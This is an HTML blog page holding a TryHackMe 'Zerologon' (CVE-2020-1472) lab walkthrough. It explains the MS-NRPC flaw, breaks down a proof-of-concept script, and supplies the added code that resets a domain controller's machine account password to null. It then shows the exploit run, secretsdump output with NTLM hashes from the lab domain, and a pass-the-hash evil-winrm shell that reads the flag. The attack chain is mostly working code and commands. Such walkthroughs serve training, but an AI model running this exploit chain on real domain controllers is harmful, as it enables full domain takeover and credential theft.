<!doctype html><html lang=en dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Try Hack ME Room Zerologon | Classroom</title><meta name=keywords content="notes,tryhackme,rooms"><meta name=description content="Try Hack ME Room Zerologon walkthough"><meta name=author content="Animesh Roy"><link rel=canonical href=https://classroom.anir0y.in/post/thm-room-zerologon/><link crossorigin=anonymous href=/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css integrity="sha256-2jIR5e+Ge/K3X9WmUVz+1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as=style><link rel=icon href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=icon type=image/png sizes=16x16 href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=icon type=image/png sizes=32x32 href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=apple-touch-icon href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=mask-icon href=https://classroom.anir0y.in/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://classroom.anir0y.in/post/thm-room-zerologon/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="https://classroom.anir0y.in/post/thm-room-zerologon/"><meta property="og:site_name" content="Classroom"><meta property="og:title" content="Try Hack ME Room Zerologon"><meta property="og:description" content="Try Hack ME Room Zerologon walkthough"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-05-10T01:22:37+05:30"><meta property="article:modified_time" content="2021-05-10T01:22:37+05:30"><meta property="article:tag" content="Notes"><meta property="article:tag" content="Tryhackme"><meta property="article:tag" content="Rooms"><meta property="og:image" content="https://classroom.anir0y.in/img/thm.gif"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://classroom.anir0y.in/img/thm.gif"><meta name=twitter:title content="Try Hack ME Room Zerologon"><meta name=twitter:description content="Try Hack ME Room Zerologon walkthough"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://classroom.anir0y.in/post/"},{"@type":"ListItem","position":2,"name":"Try Hack ME Room Zerologon","item":"https://classroom.anir0y.in/post/thm-room-zerologon/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Try Hack ME Room Zerologon","name":"Try Hack ME Room Zerologon","description":"Try Hack ME Room Zerologon walkthough","keywords":["notes","tryhackme","rooms"],"articleBody":" Zero Logon - The Zero Day Angle Room Subscription Only About The vulnerability - On September 14, Secura released a whitepaper for CVE-2020-1472, that allowed an attacker to go from Zero to Domain Admin in approximately one minute. They dubbed this vulnerability Zero Logon.\nZero Logon is a purely statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol), MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts. In short – the attack mainly focuses on a poor implementation of Cryptography. To be more specific, Microsoft chose to use AES-CFB8 for a function called ComputeNetlogonCredential, which is normally fine, except they had hard coded the Initialization Vector to use all zeros instead of a random string. When an attacker sends a message only containing zeros with the IV of zero, there is a 1-in-256 chance that the Ciphertext will be Zero.\nAbout Machine Accounts - Normally, if we tried a statistics based attack on any user account, we would get locked out. This is not the case if we apply this principal to machine accounts. Machines accounts behave in a much different way than standard user accounts. They have no predefined account lockout attempts because a 64+ character alpha numeric password is normally used to secure them, making them very difficult to break into. They’re not meant to be accessed by an end user by any means. In certain circumstances, we can dump the machine account password using a tool like Mimikatz, but if we’re at that point, we’ve already compromised the machine – and we’re looking for persistence within the domain, not lateral movement.\nAbusing the Vulnerability - Machine accounts often hold system level privileges which we can use for a variety of things. If you’re not familiar with Active Directory, we can take the Domain Controller’s Machine Account and attempt to use the granted authentication in conjunction with Secretsdump.py (SecretsDump is a password dumping utility like Mimikatz, except it lives on the Network instead of the host) to dump all of the passwords within the domain. At this point we have a rough kill chain starting to form:\nUse Zero Logon to bypass authentication on the Domain Controller’s Machine Account -\u003e Run Secretsdump.py to dump credentials -\u003e Crack/Pass Domain Admin Hashes -\u003e ??? -\u003e Profit\nAnalyzing the MS-NRPC Logon Process - At this point, we know a vulnerability exists, but we’re not quite sure how to exploit it yet. We’ll be covering that soon, but what we do know there’s a vulnerability within the way Microsoft handles Authentication within ComputeNetLogonCredetial function of MS-NRPC. To better understand the vulnerability, we need to do a bit of a deeper dive on how Microsoft handles authentication to NRPC.\nTo analyze where the vulnerability occurs, we’ll be using the Diagram provided by Secura as well as Microsoft Documentation to decipher the magic behind Zero Logon. The sources can be found at the bottom of this task.\nStep 1. The client creates a NetrServerReqChallenge and sends it off [Figure 1. Step 1]. This contains the following values:\nThe DC The Target Device (Also the DC, in our case) A Nonce (In our case is 16 Bytes of Zero). Step 2. The server receives the NetrServerReqChallenge, the server will then generate it’s own Nonce (This is called the Server Challenge), the server will send the Server Challenge back. [Figure 1. Step 2]\nStep 3. The client (us) will compute it’s NetLogon Credentials with the Server Challenge provided [Figure 1. Step 3]. It uses the NetrServerAuthenticate3 method which requires the following parameters:\nA Custom Binding Handle (Impacket handles this for us, it’s negotiated prior) An Account Name (The Domain Controller’s machine account name. ex: DC01$) A Secure Channel Type (Impacket sort of handles this for us, but we still need to specify it: [nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel]) The Computer Name (The Domain Controller ex: DC01) The Client Credential String (this will be 8 hextets of \\x00 [16 Bytes of Zero]) Negotiation Flags (The following value observed from a Win10 client with Sign/Seal flags disabled: 0x212fffff Provided by Secura) Step 4. The server will receive the NetrServerAuthenticate request and will compute the same request itself using it’s known, good values. If the results are good, the server will send the required info back to the client. [Figure 1. Step 4.]\nAt this point the attempt to exploit the Zero Logon vulnerability is under way. The above steps above will be looped through a certain number of times to attempt to exploit the Zero Logon vulnerability. The actual exploit occurs at Step 3 and 4, this where we’re hoping for the Server to a have the same computations as the client. This is where are 1-in-256 chance comes in.\nStep 5. If the server calculates the same value, the client will re-verify and once mutual agreement is confirmed, they will agree on a session key. The session key will be used to encrypt communications between the client and the server, which means authentication is successful. [Figure 1. Step 5]\nFrom there, normal RPC communications can occur.\nSources -\nTom Tervoort of Secura - https://www.secura.com/pathtoimg.php?id=2055 Microsoft - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9 Microsoft - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9 Impacket Installation Git Clone Impacket -\nAs a prior warning, Impacket can be quite fussy when it comes to some modules within nrpc.py, because of this, we recommend using the TryHackMe Attack Box. This will make the exploit run faster, additionally, we can attempt to provide better support via the Attack Box. Additionally, we are going to be using a Virtual Environment to Install Impacket. The instructions to install Impacket are as follows:\npython3 -m pip install virtualenv python3 -m virtualenv impacketEnv source impacketEnv/bin/activate pip install git+https://github.com/SecureAuthCorp/impacket After executing these commands, you should be placed within a Python3 Virtual Environment that will be compatible to modify the PoC to exploit Zero Logon.\nModifying and Weaponizing the PoC PoC and You - Proof of Concepts are incredibly important to every exploit, without them, the exploit’s are almost entirely theoretical. Fortunately, Secura was able to provide a working Proof of Concept for Zero Logon that was 90% of the way there. We simply need to make an additional call to change the password to a null value, recall Figure 3 from Task 1, Secura was even kind enough to give us the method that we need to call (NetrServerPasswordSet2). Looking up the method within the Microsoft Documentation, it’s very similar to hNetSeverAuthenticate3, so we’re going to re-use some of the same variables from that, as well as the structure.\nAnalyzing the PoC - Before we continue any further, you should download the PoC from Secura, which can be found here:\nhttps://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py\nThe script may seem quite daunting at first, but it’s quite simple, if you think back to Figure 1 from Task 1, you’ll quickly see how it all starts to fit together. Let’s start by breaking the PoC down. We’re going to be this in order of execution/importance so it’s easier to digest:\nLines 3 - 13\nfrom impacket.dcerpc.v5 import nrpc, epm from impacket.dcerpc.v5.dtypes import NULL from impacket.dcerpc.v5 import transport from impacket import crypto import hmac, hashlib, struct, sys, socket, time from binascii import hexlify, unhexlify from subprocess import check_call MAX_ATTEMPTS = 2000 Lines 1-4 import the required modules from Impacket, specifically the NRPC, EPM, Crypto, and Transport libraries. Additionally, on lines 6-8 a handful of other misc libraries are also imported, however, the Impacket libraries are the star of the show here. Lastly, on line 9, we’re defining a constant (similar to a variable, but never changes) that sets the maximum number of retries for Zero Logon to 2000.\nLines 76 - 86\nif __name__ == '__main__': if not (3 \u003c= len(sys.argv) \u003c= 4): print('Usage: zerologon_tester.py \\n') print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.') print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.') sys.exit(1) else: [_, dc_name, dc_ip] = sys.argv dc_name = dc_name.rstrip('$') perform_attack('\\\\\\\\' + dc_name, dc_ip, dc_name) Next we skipped down to the very bottom of the script so some other variables will make sense later, Line 1 is essentially declaring a main function within Python, Line 2 we are checking for the amount of parameters, and ensuring that it’s exactly 3 (zerologon_tester.py DCNAME IP). Lines 3-5 are printing the help menu only if it’s greater than 3 arguments, or less than 2 and exiting. If the required arguments are supplied, on line 8 the arguments are being passed into two variables: dc_name, and dc_ip. After the arguments are passed, dc_name is being stripped of the “$” character, as the dc_name variable shouldn’t have it. The user account name should however. Afterwards, it’s passing the variables two variables and an additional, modified variable into a module called “perform_attack”.\nLines 57 - 73\ndef perform_attack(dc_handle, dc_ip, target_computer): print('Performing authentication attempts...') rpc_con = None for attempt in range(0, MAX_ATTEMPTS): rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer) if rpc_con == None: print('=', end='', flush=True) else: break if rpc_con: print('\\nSuccess! DC can be fully compromised by a Zerologon attack.') else: print('\\nAttack failed. Target is probably patched.') sys.exit(1) Line 1 is defining where the variables are being passed into for the local function, \\DCNAME is being passed into the dc_handle variable, dc_ip is being passed into dc_ip variable, and dc_name is being passed into the target_computer variable. All of which will be used later, or passed into different modules.\nLine 4 sets the variable rpc_con equal to none, this will be kept track of consistently to check and see if authentication is successful, if it’s not, the script will continue until 2000 retries is hit. Line 5 is where the actual retries for Zero Logon occurs in the form of a for loop. Line 6 sets the rpc_con variable to the output of a different function called “try_zero_authenticate” with a couple of variables being passed to it, specifically dc_handle, dc_ip, and target_computer. All of which we addressed earlier. The next lines are simply checking if rpc_con is equal to a invalid login attempt, if it is, print =, if not, print success, if 2000 retries is hit: print attack failed.\nLines 20-25\ndef try_zero_authenticate(dc_handle, dc_ip, target_computer): binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp') rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc() rpc_con.connect() rpc_con.bind(nrpc.MSRPC_UUID_NRPC) Lines 27-40\nplaintext = b'\\x00' * 8 ciphertext = b'\\x00' * 8 flags = 0x212fffff nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\\x00', target_computer + '\\x00', plaintext) try: server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\\x00', target_computer + '$\\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,target_computer + '\\x00', ciphertext, flags) Line 1 and 2 are establishing two new variables, plaintext and ciphertext containing 16 Bytes of “\\x00” which will be used to exploit the Zero Logon vulnerability. Line 4 contains a variable called Flags. These are the default flags observed from a Windows 10 Client (using AES-CFB8) with the Sign and Seal bit disabled (Source/Credit: Secura).\nLine 6 is where the fun beings – This is where Step 1 beings in Figure 1, the client creates a NetrServerReqChallenge containing the following information required by the Microsoft Documentation:\nNTSTATUS NetrServerReqChallenge( [in, unique, string] LOGONSRV_HANDLE PrimaryName, [in, string] wchar_t* ComputerName, [in] PNETLOGON_CREDENTIAL ClientChallenge, ); The Primary Name being the DC Handle, the Computer Name being the Target Computer, and the Client Challenge being 16 bytes of “\\x00”.\nAnd the client will receive back, which will be used in Figure 1, Step 2:\nNTSTATUS NetrServerReqChallenge( [out] PNETLOGON_CREDENTIAL ServerChallenge ); Lines 8 sets up a try except (we’ll see the rest of that in the next few lines), but in line 9 is where we actually attempt to exploit the Zero Logon vulnerability, this would be Figure 1, Step 3. This section requires a fair bit more information, per the Microsoft Documentation for NetrServerAuthenticate3, the following is required:\nNTSTATUS NetrServerAuthenticate3( [in, unique, string] LOGONSRV_HANDLE PrimaryName, [in, string] wchar_t* AccountName, [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, [in, string] wchar_t* ComputerName, [in] PNETLOGON_CREDENTIAL ClientCredential, [in, out] ULONG * NegotiateFlags, ); On line 9, we supply the DC_Handle as the Primary Name, the Target Computer plus a $ as the Machine Account Name (Recall, Machine accounts do not have lockout policies), the Secure Channel Type as the Secure Channel Type previously established over RPC, the target_computer variable as the ComputerName, the Ciphertext (16 bytes of “\\x00” attempting to Abuse Zero Logon, remember there’s 1-in-256 chance that the Ciphertext will be the same as the plaintext), and lastly, our flags variable that mimics those of a Windows 10 client machine.\nNTSTATUS NetrServerAuthenticate3( [out] PNETLOGON_CREDENTIAL ServerCredential, [in, out] ULONG * NegotiateFlags, [out] ULONG * AccountRid ); Additionally, we expect to receive two (possibly 3) things back from the Server upon (hopefully) successful exploitation of Zero Logon: The ServerCredential and AccountRid, only one of which we are going to use.\nLine 44 - 54\nassert server_auth['ErrorCode'] == 0 return rpc_con except nrpc.DCERPCSessionError as ex: if ex.get_error_code() == 0xc0000022: return None else: fail(f'Unexpected error code from DC: {ex.get_error_code()}.') except BaseException as ex: fail(f'Unexpected error: {ex}.') Line 1 is retrieving the Error Code from the Server_auth variable, or the variable assigned to establish an Authentication Session with the target device. If successful, we’re going to return the rpc_con variable which will inform us that we have successfully bypassed Authentication with Zero Logon. Lines 3-12 are simply Error handling lines so the program doesn’t break and exit after receiving an error back.\nEnd of Transmission, What’s Next? - And that’s all there is to the Proof of Concept. It’s not some giant, scary monster. It even successfully exploit the Zero Logon vulnerability for us – but it stops and doesn’t do anything further, so how do we proceed?\nGood question, next we need to take a look at the Microsoft Documentation itself and see what we can do to interact with NRPC Itself. If you’re not familiar with NRPC, and you’re not that technical of an individual, look back at the last step in Task 1, Figure 3 (hint: It tells us what we need to do).\nWhat’s It All Mean, Doc? - After going back and peaking at Figure 3 on Task 1, or researching how to reset a password over RDP, you should have came across the following document: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81\nThe document outlines what information is required to change a password over NRPC. The following information is required to do so:\nNTSTATUS NetrServerPasswordSet2( [in, unique, string] LOGONSRV_HANDLE PrimaryName, [in, string] wchar_t* AccountName, [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, [in, string] wchar_t* ComputerName, [in] PNETLOGON_AUTHENTICATOR Authenticator, [in] PNL_TRUST_PASSWORD ClearNewPassword ); Going back and looking at NetrServerAuthenticate3 and NetrServerPasswordSet2, we already have a handful of the information required, like the Primary Name, Account Name, Secure Channel Type, and the Computer Name. So we simply need two values, the Authenticator and the ClearNewPassword value. Both of these are documented from Microsoft, so lets take a look at the Authenticator first:\ntypedef struct _NETLOGON_AUTHENTICATOR { NETLOGON_CREDENTIAL Credential; DWORD Timestamp; } And suddenly we’ve hit another unknown, NETLOGON_CREDENTIAL. Fortunately, Microsoft does have documentation for NETLOGON_CREDENTIAL as well:\ntypedef struct _NETLOGON_CREDENTIAL { CHAR data[8]; } NETLOGON_CREDENTIAL, *PNETLOGON_CREDENTIAL; Per the documentation, NETLOGON_CREDENTIAL can take 8 bytes of data, the second bullet point outlines that “the data field carries 8 bytes of encrypted data, as specified in the Netlogon Credential Computation”, fortunately we know this value, thanks to Zero Logon, it’s 8 bytes of Zero. In terms of the Timestamp, it’s a DWORD value, so it can either be a one or a zero. Zero sounds perfectly find to me.\nIn order to change the password the Microsoft Documentation states that: The Netlogon Password consists of 512 bytes of random padding (minus the length of the password, so junk+password) with the last four bytes indicting the length of the password, totaling 516 bytes. For the simplicity of this room, we can simply supply 516 bytes of all 00 to make a null password. Eventually, we can work towards creating our own custom password, but once again, for simplicity, we’re setting it to a null value now.\nLevel up Now that we know the required arguments to change the password via NRPC, we actually have to implement it in Python. We need to take a look at the nrpc.py module within Impacket to see the required structure for how we can craft a netrServerPasswordSet2 Request:\ndef hNetrServerPasswordSet2(dce, primaryName, accountName, secureChannelType, computerName, authenticator, clearNewPasswordBlob): request = NetrServerPasswordSet2() request['PrimaryName'] = checkNullString(primaryName) request['AccountName'] = checkNullString(accountName) request['SecureChannelType'] = secureChannelType request['ComputerName'] = checkNullString(computerName) request['Authenticator'] = authenticator request['ClearNewPassword'] = clearNewPasswordBlob return dce.request(request) As expected, most of the field names are the same as what Microsoft provided, except with some differences. Next, we need to know how to structure the Authenticator portion as well:\nclass NETLOGON_AUTHENTICATOR(NDRSTRUCT): structure = ( ('Credential', NETLOGON_CREDENTIAL), ('Timestamp', DWORD), ) The format here is a little bit different compared to the prior, but we’ll adjust accordingly when we go to slot it into the PoC, but while we’re talking about slotting it into the PoC, where will our added code go?\nOur added code will go immediately before “return rpc_con” on line 45. This is where we know we have successful authentication, we want to grab that before we return to the previous function and terminate the RPC connection. Now that we know all the required information that we’ll need to add to the PoC, we’ll save you the painstaking effort of writing your own code, and you can use the pre-written code below. The above explanations should help aid in understanding it.\nThe Additional Code we’re slotting in:\nnewPassRequest = nrpc.NetrServerPasswordSet2() newPassRequest['PrimaryName'] = dc_handle + '\\x00' newPassRequest['AccountName'] = target_computer + '$\\x00' newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel auth = nrpc.NETLOGON_AUTHENTICATOR() auth['Credential'] = b'\\x00' * 8 auth['Timestamp'] = 0 newPassRequest['Authenticator'] = auth newPassRequest['ComputerName'] = target_computer + '\\x00' newPassRequest['ClearNewPassword'] = b'\\x00' * 516 rpc_con.request(newPassRequest) At this point, your code should be good to go, and you should be able to successfully exploit Zero Logon. If you are still having issues, you can use the following code found here:\nhttps://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py\nAnswers Lab it UP! Nmap Result sudo nmap -sC -sV -oA nmap/DC01HOLOLIVE 10.10.129.187 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 23:51 IST Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.26% done; ETC: 23:52 (0:00:00 remaining) Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.26% done; ETC: 23:52 (0:00:00 remaining) Nmap scan report for 10.10.129.187 Host is up (0.16s latency). Not shown: 987 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn't have a title (text/html). 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-05-09 18:21:42Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hololive.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hololive.local0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: HOLOLIVE | NetBIOS_Domain_Name: HOLOLIVE | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: hololive.local | DNS_Computer_Name: DC01.hololive.local | Product_Version: 10.0.17763 |_ System_Time: 2021-05-09T18:22:11+00:00 | ssl-cert: Subject: commonName=DC01.hololive.local | Not valid before: 2021-05-08T18:20:30 |_Not valid after: 2021-11-07T18:20:30 |_ssl-date: 2021-05-09T18:22:20+00:00; 0s from scanner time. Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-05-09T18:22:11 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 78.14 seconds What is the NetBIOS name of the Domain Controller? ANS: DC01 Explanation\n#Nmap snip [snip] .3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: HOLOLIVE | NetBIOS_Domain_Name: HOLOLIVE | NetBIOS_Computer_Name: \"DC01\" #Here is the ans | DNS_Domain_Name: hololive.local | DNS_Computer_Name: DC01.hololive.local | Product_Version: 10.0.17763 |_ System_Time: 2021-05-09T18:22:11+00:00 [snip] What is the NetBIOS domain name of the network? ANS: HOLOLIVE Explanation\n#Nmap snip [snip] .3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: HOLOLIVE | NetBIOS_Domain_Name: \"HOLOLIVE\" #Here is the ans | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: hololive.local | DNS_Computer_Name: DC01.hololive.local | Product_Version: 10.0.17763 |_ System_Time: 2021-05-09T18:22:11+00:00 [snip] What domain are you attacking? ANS: hololive.local Explanation\n#Nmap snip [snip] .3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: HOLOLIVE | NetBIOS_Domain_Name: HOLOLIVE | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: \"hololive.local\" # ANS | DNS_Computer_Name: DC01.hololive.local | Product_Version: 10.0.17763 |_ System_Time: 2021-05-09T18:22:11+00:00 [snip] What is the Local Administrator’s NTLM hash? ANS: 3f3ef89114fb063e3d7fc23c20f65568 Explanation\nActivate Venv source impacketEnv/bin/activate (impacketEnv) ┌─[✗]─[mentor@attackerVM]─[~/thm/zer0login] └──╼ $python3 zeroLogon.py DC01 10.10.129.187 _____ __ / _ / ___ _ __ ___ / / ___ __ _ ___ _ __ \\// / / _ \\ '__/ _ \\ / / / _ \\ / _` |/ _ \\| '_ \\ / //\\ __/ | | (_) | / /__| (_) | (_| | (_) | | | | /____/\\___|_| \\___/ \\____/\\___/ \\__, |\\___/|_| |_| |___/ Vulnerability Discovered by Tom Tervoort Exploit by Ronnie Bartwitz Performing authentication attempts... Failure to Autheticate at attempt number: 28 Failure to Autheticate at attempt number: 86 Zero Logon successfully exploited, changing password. Password dumping: ╼ $secretsdump.py -just-dc -no-pass DC01\\$@10.10.129.187 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:\"3f3ef89114fb063e3d7fc23c20f65568\"::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2179ebfa86eb0e3cbab2bd58f2c946f5::: hololive.local\\a-koronei:1104:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954::: hololive.local\\a-fubukis:1106:aad3b435b51404eeaad3b435b51404ee:2c90bc6c1c35b71f455f3d08cf4947bd::: [snip] [*] Cleaning up... How many Domain Admin accounts are there? ANS: 2 Explaination\nNaming policy, Administrator accounts are having ‘A-’ as Firt initial.\nWhat is the root flag? ANS: Pass the Hash Evil-WinRm with NTLM Hash! [mentor@attackerVM]─[~/thm/zer0login] └──╼ $evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.129.187 Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e dir *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e cd ../Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e dir Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 9/20/2020 2:02 PM 24 root.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e type root.txt \"THM{DELTED_FOR_FLAG_PROTECTION}\" *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e ","wordCount":"3632","inLanguage":"en","image":"https://classroom.anir0y.in/img/thm.gif","datePublished":"2021-05-10T01:22:37+05:30","dateModified":"2021-05-10T01:22:37+05:30","author":{"@type":"Person","name":"Animesh Roy"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://classroom.anir0y.in/post/thm-room-zerologon/"},"publisher":{"@type":"Organization","name":"Classroom","logo":{"@type":"ImageObject","url":"https://classroom.anir0y.in/img/avatar.jpeg"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://classroom.anir0y.in/ accesskey=h title="Classroom (Alt + H)"><img src=https://classroom.anir0y.in/img/avatar.jpeg alt aria-label=logo height=35>Classroom</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://classroom.anir0y.in/post/ title=Posts><span>Posts</span></a></li><li><a href=https://classroom.anir0y.in/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://classroom.anir0y.in/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://classroom.anir0y.in/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://classroom.anir0y.in/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://classroom.anir0y.in/about/me/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://classroom.anir0y.in/>Home</a>&nbsp;»&nbsp;<a href=https://classroom.anir0y.in/post/>Posts</a></div><h1 class="post-title entry-hint-parent">Try Hack ME Room Zerologon</h1><div class=post-description>Try Hack ME Room Zerologon walkthough</div><div class=post-meta><span title='2021-05-10 01:22:37 +0530 IST'>May 10, 2021</span>&nbsp;·&nbsp;<span>18 min</span>&nbsp;·&nbsp;<span>Animesh Roy</span>&nbsp;|&nbsp;<span>
<a href=https://github.com/anir0y/classroom/tree/master/content/post/thm-room-zerologon.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></span></div></header><figure class=entry-cover><img loading=eager src=https://classroom.anir0y.in/img/thm.gif alt="cover image"></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#zero-logon---the-zero-day-angle>Zero Logon - The Zero Day Angle</a></li><li><a href=#room-subscription-only>Room Subscription Only</a><ul><li><a href=#about-the-vulnerability-->About The vulnerability -</a></li><li><a href=#about-machine-accounts-->About Machine Accounts -</a></li><li><a href=#abusing-the-vulnerability-->Abusing the Vulnerability -</a></li><li><a href=#analyzing-the-ms-nrpc-logon-process-->Analyzing the MS-NRPC Logon Process -</a></li></ul></li><li><a href=#impacket-installation>Impacket Installation</a></li><li><a href=#modifying-and-weaponizing-the-poc>Modifying and Weaponizing the PoC</a><ul><li><a href=#poc-and-you-->PoC and You -</a></li><li><a href=#analyzing-the-poc-->Analyzing the PoC -</a></li><li><a href=#end-of-transmission-whats-next-->End of Transmission, What&rsquo;s Next? -</a></li><li><a href=#whats-it-all-mean-doc-->What&rsquo;s It All Mean, Doc? -</a></li><li><a href=#level-up>Level up</a></li><li><a href=#answers>Answers</a></li></ul></li><li><a href=#lab-it-up>Lab it UP!</a><ul><li><a href=#nmap-result>Nmap Result</a></li><li><a href=#what-is-the-netbios-name-of-the-domain-controller>What is the NetBIOS name of the Domain Controller?</a></li><li><a href=#what-is-the-netbios-domain-name-of-the-network>What is the NetBIOS domain name of the network?</a></li><li><a 